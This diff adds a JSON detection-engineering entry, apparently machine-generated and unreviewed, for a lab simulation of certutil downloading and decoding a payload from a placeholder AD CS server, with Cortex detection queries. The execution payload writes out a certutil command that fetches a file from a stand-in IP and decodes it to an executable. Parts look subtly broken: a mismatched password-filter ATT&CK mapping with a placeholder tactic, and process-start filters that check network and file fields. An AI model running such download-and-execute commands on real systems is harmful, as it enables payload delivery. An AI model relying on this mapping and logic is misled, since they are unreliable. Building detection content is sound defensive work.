@@ -1,0 +1,192 @@
+{
+  "id": "TTP-0000-0198",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Suspicious Certutil AD CS Contact",
+    "summary": "An attacker uses certutil to download and decode a payload from an AD CS server, potentially to bypass EDR detection. Cortex should detect the suspicious certutil behavior and network contact.",
+    "description": "An attacker uses certutil to download and decode a payload from an AD CS server, potentially to bypass EDR detection. Cortex should detect the suspicious certutil behavior and network contact."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1556",
+        "subtechnique_id": "T1556.002",
+        "name": "T1556.002",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "certutil.exe -urlcache -split -f http://192.0.2.100/payload.bin payload.bin\n\ncertutil.exe -decode payload.bin decoded_payload.exe\n\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Certutil process execution",
+        "expected_value": "action_process_image_name = 'certutil.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound connection to AD CS server",
+        "expected_value": "action_remote_ip = '192.0.2.100'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Downloaded payload file",
+        "expected_value": "action_file_path = 'payload.bin'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Suspicious Certutil AD CS Contact",
+        "description": "Detection of certutil downloading a file from an AD CS server",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'certutil.exe'\n| filter action_file_path contains 'payload.bin'\n| filter action_remote_ip = '192.0.2.100'",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1105",
+          "T1556.002"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Certutil AD CS Download Behavior",
+        "description": "Behavioral deviation indicating certutil downloading from AD CS server",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'certutil.exe'\n| filter action_remote_ip = '192.0.2.100'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "certutil.exe process start with AD CS IP",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1105",
+          "T1556.002"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Certutil AD CS Network Contact",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK\n| filter action_remote_ip = '192.0.2.100'\n| filter action_process_image_name = 'certutil.exe'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Suspicious Certutil AD CS contact; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/suspicious-certutil-ad-cs-contact"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Suspicious Certutil AD CS contact",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/suspicious-certutil-ad-cs-contact",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1105",
+      "url": "https://attack.mitre.org/techniques/T1105/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1556.002",
+      "url": "https://attack.mitre.org/techniques/T1556/002/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
